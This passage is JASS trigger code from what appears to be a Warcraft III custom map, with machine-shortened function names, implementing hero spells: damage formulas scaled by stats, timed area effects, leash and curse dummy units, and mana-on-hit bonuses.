call AddSpecialEffectTargetUnitBJ("chest",GetEnumUnit(),"Abilities\\Spells\\Other\\CrushingWave\\CrushingWaveDamage.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call UnitDamageTargetBJ(WD[RS[0]],GetEnumUnit(),150.*I2R(GetUnitAbilityLevelSwapped($41303852,WD[RS[0]]))+I2R(GetHeroStatBJ(bj_HEROSTAT_INT,WD[RS[0]],true))*(7.*N0[GetConvertedPlayerId(GetOwningPlayer(WD[RS[0]]))]),ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
endfunction
function wo takes nothing returns boolean
if not (RT[RS[0]]==0.) then
return false
endif
return true
endfunction
function wp takes nothing returns nothing
endfunction
function wq takes nothing returns boolean
if not (RU[RS[0]]>=.15) then
return false
endif
return true
endfunction
function wr takes nothing returns boolean
if not (RR[RQ[0]]<=0) then
return false
endif
return true
endfunction
function ws takes nothing returns boolean
if not (RX[RS[0]]==true) then
return false
endif
return true
endfunction
function wt takes nothing returns nothing
set RS[0]=1
loop
exitwhen RS[0]>RQ[0]
if ws() then
set RT[RS[0]]=RT[RS[0]]-.03
set RV[RS[0]]=RV[RS[0]]+10.
call SetUnitScalePercent(XD[RS[0]],100.+RV[RS[0]],100.+RV[RS[0]],100.+RV[RS[0]])
if wl() then
call ForGroupBJ(RW[RS[0]],function wk)
else
call ForGroupBJ(RW[RS[0]],function wj)
endif
if wm() then
set RU[RS[0]]=RU[RS[0]]+.03
else
call DoNothing()
endif
if wo() then
call AddSpecialEffectLocBJ(WE[RS[0]],"Abilities\\Spells\\Human\\ThunderClap\\ThunderClapCaster.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call RemoveUnit(XD[RS[0]])
call ForGroupBJ(RW[RS[0]],function wn)
else
call DoNothing()
endif
if wq() then
call ForGroupBJ(RW[RS[0]],function wp)
call GroupClear(RW[RS[0]])
call DestroyGroup(RW[RS[0]])
call RemoveLocation(WE[RS[0]])
set RV[RS[0]]=0.
set RX[RS[0]]=false
set RR[RS[0]]=RR[RS[0]]-1
else
call DoNothing()
endif
if wr() then
call PauseTimerBJ(true,RY)
set RQ[0]=0
else
call DoNothing()
endif
else
call DoNothing()
endif
set RS[0]=RS[0]+1
endloop
endfunction
function wu takes nothing returns nothing
set XE=CreateTrigger()
call TriggerRegisterTimerExpireEventBJ(XE,RY)
call TriggerAddAction(XE,function wt)
endfunction
function wv takes nothing returns boolean
if not (GetSpellAbilityId()==$41304738) then
return false
endif
return true
endfunction
function ww takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_STRUCTURE)==false
endfunction
function wx takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function wy takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(WD[RQ[0]]))==true
endfunction
function wz takes nothing returns boolean
return GetBooleanAnd(wx(),wy())
endfunction
function w0 takes nothing returns boolean
return GetBooleanAnd(ww(),wz())
endfunction
function w1 takes nothing returns nothing
call CreateNUnitsAtLoc(1,$68303053,GetOwningPlayer(WD[RQ[0]]),WE[RQ[0]],bj_UNIT_FACING)
set WF[RQ[0]]=GetLastCreatedUnit()
call IssueTargetOrderBJ(WF[RQ[0]],"magicleash",GetEnumUnit())
call UnitApplyTimedLifeBJ(1.5,$42544C46,WF[RQ[0]])
call GroupAddUnitSimple(GetEnumUnit(),RW[RQ[0]])
endfunction
function w2 takes nothing returns nothing
set RQ[0]=RQ[0]+1
set RR[RQ[0]]=RR[RQ[0]]+1
set RS[0]=0
set RT[RQ[0]]=1.5
set RU[RQ[0]]=0.
set RV[RQ[0]]=0.
set WD[RQ[0]]=GetTriggerUnit()
set WE[RQ[0]]=GetSpellTargetLoc()
call CreateNUnitsAtLoc(1,$68303054,GetOwningPlayer(WD[RQ[0]]),WE[RQ[0]],bj_UNIT_FACING)
set XD[RQ[0]]=GetLastCreatedUnit()
set RW[RQ[0]]=GetUnitsInRangeOfLocMatching(300.,WE[RQ[0]],Condition(function w0))
call ForGroupBJ(RW[RQ[0]],function w1)
set RX[RQ[0]]=true
call StartTimerBJ(SO,true,.03)
endfunction
function w3 takes nothing returns nothing
set XG=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XG,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(XG,Condition(function wv))
call TriggerAddAction(XG,function w2)
endfunction
function w4 takes nothing returns nothing
set XF[RS[0]]=GetUnitLoc(GetEnumUnit())
call RemoveLocation(XF[RS[0]])
endfunction
function w5 takes nothing returns nothing
set XF[RS[0]]=GetUnitLoc(GetEnumUnit())
call RemoveLocation(XF[RS[0]])
endfunction
function w6 takes nothing returns boolean
if not (RU[RS[0]]<=0.) then
return false
endif
return true
endfunction
function w7 takes nothing returns boolean
if not (RT[RS[0]]<=0.) then
return false
endif
return true
endfunction
function w8 takes nothing returns nothing
call AddSpecialEffectTargetUnitBJ("chest",GetEnumUnit(),"Abilities\\Spells\\Other\\CrushingWave\\CrushingWaveDamage.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call UnitDamageTargetBJ(WD[RS[0]],GetEnumUnit(),3000.+I2R(GetHeroStatBJ(bj_HEROSTAT_INT,WD[RS[0]],true))*(13.*N0[GetConvertedPlayerId(GetOwningPlayer(WD[RS[0]]))]),ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
endfunction
function w9 takes nothing returns boolean
if not (RT[RS[0]]==0.) then
return false
endif
return true
endfunction
function xB takes nothing returns nothing
endfunction
function xC takes nothing returns boolean
if not (RU[RS[0]]>=.15) then
return false
endif
return true
endfunction
function xD takes nothing returns boolean
if not (RR[RQ[0]]<=0) then
return false
endif
return true
endfunction
function xE takes nothing returns boolean
if not (RX[RS[0]]==true) then
return false
endif
return true
endfunction
function xF takes nothing returns nothing
set RS[0]=1
loop
exitwhen RS[0]>RQ[0]
if xE() then
set RT[RS[0]]=RT[RS[0]]-.03
set RV[RS[0]]=RV[RS[0]]+10.
call SetUnitScalePercent(XD[RS[0]],100.+RV[RS[0]],100.+RV[RS[0]],100.+RV[RS[0]])
if w6() then
call ForGroupBJ(RW[RS[0]],function w5)
else
call ForGroupBJ(RW[RS[0]],function w4)
endif
if w7() then
set RU[RS[0]]=RU[RS[0]]+.03
else
call DoNothing()
endif
if w9() then
call AddSpecialEffectLocBJ(WE[RS[0]],"Abilities\\Spells\\Human\\ThunderClap\\ThunderClapCaster.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call RemoveUnit(XD[RS[0]])
call ForGroupBJ(RW[RS[0]],function w8)
else
call DoNothing()
endif
if xC() then
call ForGroupBJ(RW[RS[0]],function xB)
call GroupClear(RW[RS[0]])
call DestroyGroup(RW[RS[0]])
call RemoveLocation(WE[RS[0]])
set RV[RS[0]]=0.
set RX[RS[0]]=false
set RR[RS[0]]=RR[RS[0]]-1
else
call DoNothing()
endif
if xD() then
call PauseTimerBJ(true,RY)
set RQ[0]=0
else
call DoNothing()
endif
else
call DoNothing()
endif
set RS[0]=RS[0]+1
endloop
endfunction
function xG takes nothing returns nothing
set XH=CreateTrigger()
call TriggerRegisterTimerExpireEventBJ(XH,SO)
call TriggerAddAction(XH,function xF)
endfunction
function xH takes nothing returns boolean
if not (GetSpellAbilityId()==$41313754) then
return false
endif
return true
endfunction
function xI takes nothing returns nothing
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303634,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"magicleash",GetTriggerUnit())
call RemoveLocation(V0)
call UnitApplyTimedLifeBJ(7.,$42544C46,GetLastCreatedUnit())
call UnitAddAbilityBJ($41313753,GetTriggerUnit())
call TriggerSleepAction(7.)
call UnitRemoveAbilityBJ($41313753,GetTriggerUnit())
endfunction
function xJ takes nothing returns nothing
set XI=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XI,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(XI,Condition(function xH))
call TriggerAddAction(XI,function xI)
endfunction
function xK takes nothing returns boolean
if not (UnitHasBuffBJ(GetTriggerUnit(),$42303847)==true) then
return false
endif
return true
endfunction
function xL takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetAttacker(),I2R(GetHeroStr(GetTriggerUnit(),true))*1.5,ATTACK_TYPE_NORMAL,DAMAGE_TYPE_NORMAL)
endfunction
function xM takes nothing returns nothing
set XJ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XJ,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddCondition(XJ,Condition(function xK))
call TriggerAddAction(XJ,function xL)
endfunction
function xN takes nothing returns boolean
if not (GetSpellAbilityId()==$41303935) then
return false
endif
return true
endfunction
function xO takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41303943)>=1) then
return false
endif
return true
endfunction
function xP takes nothing returns boolean
if not (UnitHasBuffBJ(GetTriggerUnit(),$42303141)==true) then
return false
endif
return true
endfunction
function xQ takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetHeroStatBJ(bj_HEROSTAT_STR,GetTriggerUnit(),true))*Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]*I2R(GetUnitAbilityLevelSwapped($41303935,GetTriggerUnit())),ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL)
call IssueTargetOrderBJ(GetSpellTargetUnit(),"attack",GetTriggerUnit())
set W7[16]=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303057,GetOwningPlayer(GetTriggerUnit()),W7[16],bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"curse",GetSpellTargetUnit())
call UnitApplyTimedLifeBJ(1.,$42544C46,GetLastCreatedUnit())
if xO() then
call CreateNUnitsAtLoc(1,$68303545,GetOwningPlayer(GetTriggerUnit()),W7[16],bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
else
endif
if xP() then
call UnitAddAbilityBJ($41305750,GetTriggerUnit())
call SetUnitAbilityLevel(GetTriggerUnit(),$41305750,GetUnitAbilityLevel(GetTriggerUnit(),$41303935))
call TriggerSleepAction(5.)
call UnitRemoveAbilityBJ($41305750,GetTriggerUnit())
else
endif
call RemoveLocation(W7[16])
endfunction
function xR takes nothing returns nothing
set XK=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XK,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(XK,Condition(function xN))
call TriggerAddAction(XK,function xQ)
endfunction
function xS takes nothing returns boolean
if not (GetSpellAbilityId()==$41304548) then
return false
endif
return true
endfunction
function xT takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41303943)>=1) then
return false
endif
return true
endfunction
function xU takes nothing returns boolean
if not (UnitHasBuffBJ(GetTriggerUnit(),$42303141)==true) then
return false
endif
return true
endfunction
function xV takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetHeroStatBJ(bj_HEROSTAT_STR,GetTriggerUnit(),true))*Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]*15.,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL)
call IssueTargetOrderBJ(GetSpellTargetUnit(),"attack",GetTriggerUnit())
set W7[16]=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303057,GetOwningPlayer(GetTriggerUnit()),W7[16],bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"curse",GetSpellTargetUnit())
call UnitApplyTimedLifeBJ(1.,$42544C46,GetLastCreatedUnit())
if xT() then
call CreateNUnitsAtLoc(1,$68303545,GetOwningPlayer(GetTriggerUnit()),W7[16],bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
else
endif
if xU() then
call UnitAddAbilityBJ($41305751,GetTriggerUnit())
call TriggerSleepAction(5.)
call UnitRemoveAbilityBJ($41305751,GetTriggerUnit())
else
endif
call RemoveLocation(W7[16])
endfunction
function xW takes nothing returns nothing
set XL=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XL,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(XL,Condition(function xS))
call TriggerAddAction(XL,function xV)
endfunction
function xX takes nothing returns nothing
local unit Hu=GetEnumUnit()
local unit NR=GetTriggerUnit()
local real Hb=I2R(150*GetUnitAbilityLevel(NR,$41305A55)+GetHeroStr(NR,true)*5)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
local string M6=""
if GetUnitAbilityLevel(Hu,$42303639)>=1 then
call UnitDamageTarget(NR,Hu,Hb*2,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
call ng(Hu,NR,"+"+I2S(R2I(Hb*2)),.026,255,0,0,0)
else
call UnitDamageTarget(NR,Hu,Hb,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
call ng(Hu,NR,"+"+I2S(R2I(Hb)),.023,255,100,0,0)
endif
if GetOwningPlayer(NR)==GetLocalPlayer() then
set M6="Abilities\\Spells\\Human\\MarkOfChaos\\MarkOfChaosDone.mdl"
endif
call DestroyEffect(AddSpecialEffectTarget(M6,Hu,"chest"))
call IssueTargetOrder(Hu,"attack",NR)
set NR=null
set Hu=null
endfunction
function xY takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local string Mc
local location No
local group Np
local boolexpr Nt
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\AnnihilationBlast.mdx"
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,Hu,"origin"))
set No=GetUnitLoc(Hu)
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),400,Nt)
set Nu=R2I(I2R(200+GetHeroStr(Hu,true)/3)*GetUnitAbilityLevel(Hu,$41303330)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1])
set Pq=Hu
call ForGroup(Np,function m8)
call DestroyGroup(Np)
call DestroyBoolExpr(Nt)
call RemoveLocation(No)
set No=null
set Np=null
set Nt=null
else
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\AnnihilationBlast.mdx"
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,Hu,"origin"))
set No=GetUnitLoc(Hu)
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),400,Nt)
call nd(Np,$4131324E,1,"creepthunderbolt")
call DestroyGroup(Np)
call DestroyBoolExpr(Nt)
call RemoveLocation(No)
set No=null
set Np=null
set Nt=null
call UnitRemoveAbility(Hu,$41436D32)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function xZ takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local string Mc
local location No
local group Np
local boolexpr Nt
local timer Ny
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\AnnihilationBlast.mdx"
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,Hu,"origin"))
set No=GetUnitLoc(Hu)
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),400,Nt)
set Nu=R2I(I2R(200+GetHeroStr(Hu,true)/3)*GetUnitAbilityLevel(Hu,$41303330)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1])
set Pq=Hu
call ForGroup(Np,function m8)
call DestroyGroup(Np)
call DestroyBoolExpr(Nt)
call RemoveLocation(No)
set No=null
set Np=null
set Nt=null
else
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\AnnihilationBlast.mdx"
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,Hu,"origin"))
set No=GetUnitLoc(Hu)
set Np=CreateGroup()
set Nt=Condition(function mx)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),400,Nt)
call nd(Np,$4131324E,1,"creepthunderbolt")
call DestroyGroup(Np)
call DestroyBoolExpr(Nt)
call RemoveLocation(No)
set No=null
set Np=null
set Nt=null
call UnitRemoveAbility(Hu,$41313753)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
call UnitAddAbility(Hu,$41436D32)
set Ny=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Ny),0,Hu)
call SaveInteger(Nq,GetHandleId(Ny),1,7)
call TimerStart(Ny,1,true,function xY)
set Ny=null
endif
set Hu=null
endfunction
function xa takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
if UnitAlive(Hu) then
call SetUnitState(Hu,UNIT_STATE_LIFE,I2R(LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)))
endif
else
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call UnitRemoveAbility(Hu,$41313638)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function xb takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
if UnitAlive(Hu) then
call SetUnitState(Hu,UNIT_STATE_LIFE,I2R(LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)))
endif
else
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),3))
call UnitRemoveAbility(Hu,$41313631)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function xc takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local integer L9
local timer Hc
local location Ht
local group V9
local boolexpr Nb
if GetSpellAbilityId()==$41305350 then
set L9=R2I(GetUnitState(Hu,UNIT_STATE_LIFE))
call UnitAddAbility(Hu,$41313631)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,L9)
call SaveInteger(Nq,GetHandleId(Hc),2,121)
call SaveEffectHandle(Nq,GetHandleId(Hc),3,AddSpecialEffectTarget("war3mapImported\\Infernal_Bulwark.mdx",Hu,"chest"))
call TimerStart(Hc,.05,true,function xb)
elseif GetSpellAbilityId()==$41305351 then
set L9=R2I(GetUnitState(Hu,UNIT_STATE_LIFE))
call UnitAddAbility(Hu,$41313638)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,L9)
call SaveInteger(Nq,GetHandleId(Hc),2,120)
call SaveEffectHandle(Nq,GetHandleId(Hc),3,AddSpecialEffectTarget("war3mapImported\\Infernal_Bulwark.mdx",Hu,"chest"))
call TimerStart(Hc,.05,true,function xa)
elseif GetSpellAbilityId()==$41303330 then
call UnitAddAbility(Hu,$41313753)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,7)
call TimerStart(Hc,1,true,function xZ)
elseif GetSpellAbilityId()==$41305A55 then
set Ht=GetUnitLoc(Hu)
set V9=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(V9,GetLocationX(Ht),GetLocationY(Ht),400,Nb)
call nd(V9,$4131324E,3,"creepthunderbolt")
call ForGroup(V9,function xX)
call DestroyBoolExpr(Nb)
call DestroyGroup(V9)
call RemoveLocation(Ht)
set Ht=null
set Nb=null
set V9=null
endif
set Hc=null
set Hu=null
endfunction
function xd takes nothing returns nothing
local trigger XM=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XM,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(XM,function xc)
set XM=null
endfunction
function xe takes nothing returns boolean
if not (UnitHasBuffBJ(GetTriggerUnit(),$42303141)==true) then
return false
endif
return true
endfunction
function xf takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41313348)>=1) then
return false
endif
return true
endfunction
function xg takes nothing returns boolean
if not (UnitHasBuffBJ(GetTriggerUnit(),$42303141)==true) then
return false
endif
return true
endfunction
function xh takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$4131334A)>=1) then
return false
endif
return true
endfunction
function xi takes nothing returns nothing
if xf() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitManaBJ(GetTriggerUnit(),GetUnitState(GetTriggerUnit(),UNIT_STATE_MANA)+(6.*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41313348))+GetUnitState(GetTriggerUnit(),UNIT_STATE_MAX_MANA)/100.))
call CreateTextTagUnitBJ("+"+I2S(6*GetUnitAbilityLevel(GetTriggerUnit(),$41313348)+R2I(GetUnitState(GetTriggerUnit(),UNIT_STATE_MAX_MANA))/100),GetTriggerUnit(),0,10.,50.,50.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
if xe() then
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303138,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call IssueImmediateOrder(GetLastCreatedUnit(),"howlofterror")
call UnitApplyTimedLifeBJ(1.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(V0)
else
endif
call TriggerSleepAction(10.)
call EnableTrigger(GetTriggeringTrigger())
else
endif
if xh() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitManaBJ(GetTriggerUnit(),GetUnitState(GetTriggerUnit(),UNIT_STATE_MANA)+(60.+GetUnitState(GetTriggerUnit(),UNIT_STATE_MAX_MANA)/50.))
call CreateTextTagUnitBJ("+"+I2S(60+R2I(GetUnitState(GetTriggerUnit(),UNIT_STATE_MAX_MANA))/50),GetTriggerUnit(),0,10.,50.,50.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
if xg() then
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303138,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call SetUnitAbilityLevel(GetLastCreatedUnit(),$41313349,2)
call IssueImmediateOrder(GetLastCreatedUnit(),"howlofterror")
call UnitApplyTimedLifeBJ(1.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(V0)
else
endif
call TriggerSleepAction(10.)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function xj takes nothing returns nothing
set XN=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(XN,EVENT_PLAYER_UNIT_ATTACKED)
call TriggerAddAction(XN,function xi)
endfunction
function xk takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local real Mc
local location No
local real Np
local location Nt
local group Ny
local boolexpr Ot
local real Ou
call SaveReal(Nq,GetHandleId(GetExpiredTimer()),1,LoadReal(Nq,GetHandleId(GetExpiredTimer()),1)+150)
if LoadReal(Nq,GetHandleId(GetExpiredTimer()),1)<750 then
set Mc=LoadReal(Nq,GetHandleId(GetExpiredTimer()),1)
set No=GetUnitLoc(Hu)
set Np=0
loop
set Nt=nU(No,Mc,Np)
set Ny=CreateGroup()
set Ot=Condition(function mw)
call GroupEnumUnitsInRange(Ny,GetLocationX(Nt),GetLocationY(Nt),150,Ot)
call DestroyBoolExpr(Ot)
call DestroyEffect(AddSpecialEffect("Units\\NightElf\\Wisp\\WispExplode.mdl",GetLocationX(Nt),GetLocationY(Nt)))
if GetUnitAbilityLevel(Hu,$41313132)>=1 then
set Ou=I2R(100*GetUnitAbilityLevel(Hu,$41313132)+(GetHeroStr(Hu,true)+GetHeroInt(Hu,true)))*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Ou)
else
set Ou=I2R(1000+(GetHeroStr(Hu,true)+GetHeroInt(Hu,true)))*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Ou+Ou/2)
endif
call ForGroup(Ny,function m4)
call DestroyGroup(Ny)
set Ot=null
set Ny=null
set Ny=CreateGroup()
set Ot=Condition(function mx)
call GroupEnumUnitsInRange(Ny,GetLocationX(Nt),GetLocationY(Nt),150,Ot)
call DestroyBoolExpr(Ot)
if GetUnitAbilityLevel(Hu,$41313132)>=1 then
set Ou=I2R(50*GetUnitAbilityLevel(Hu,$41313132)+(GetHeroStr(Hu,true)+GetHeroInt(Hu,true)))*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Ou*2)
else
set Ou=I2R(500+(GetHeroStr(Hu,true)+GetHeroInt(Hu,true)))*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(Ou*4)
endif
set Pq=Hu
call ForGroup(Ny,function nB)
call DestroyGroup(Ny)
set Ot=null
call RemoveLocation(Nt)
set Nt=null
set Np=Np+60
exitwhen Np>=360
endloop
set Hu=null
call RemoveLocation(No)
set No=null
else
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Ny=null
set Hu=null
endfunction
function xl takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit NQ
local timer Hc
local group Na
local boolexpr Vx
local real NS
local location Ht
if GetSpellAbilityId()==$41313132 or GetSpellAbilityId()==$41313145 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveReal(Nq,GetHandleId(Hc),1,0)
call TimerStart(Hc,.5,true,function xk)
set Hc=null
elseif GetSpellAbilityId()==$41305A31 then
set NS=I2R((100+GetHeroInt(Hu,true))*GetUnitAbilityLevel(Hu,$41305A31))*N0[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitDamageTarget(Hu,GetSpellTargetUnit(),NS,true,false,ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC,WEAPON_TYPE_WHOKNOWS)
elseif GetSpellAbilityId()==$4130385A then
set NS=I2R(GetHeroInt(Hu,true))*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
call m2(GetSpellTargetUnit(),R2I(NS))
elseif GetSpellAbilityId()==$5330304C then
set Ht=GetSpellTargetLoc()
set NQ=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303144,Ht,0)
call nD(NQ,7)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),600,Vx)
call DestroyBoolExpr(Vx)
set NS=I2R(1000*GetUnitAbilityLevel(Hu,$5330304C)+2*(GetHeroStr(Hu,true)+GetHeroAgi(Hu,true)+GetHeroInt(Hu,true)))*TQ[GetPlayerId(GetOwningPlayer(Hu))+1]
set Nu=R2I(NS)
call ForGroup(Na,function m4)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
elseif GetSpellAbilityId()==$41304153 then
set Ht=GetUnitLoc(Hu)
set Na=CreateGroup()
set Vx=Condition(function mw)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),700,Vx)
call DestroyBoolExpr(Vx)
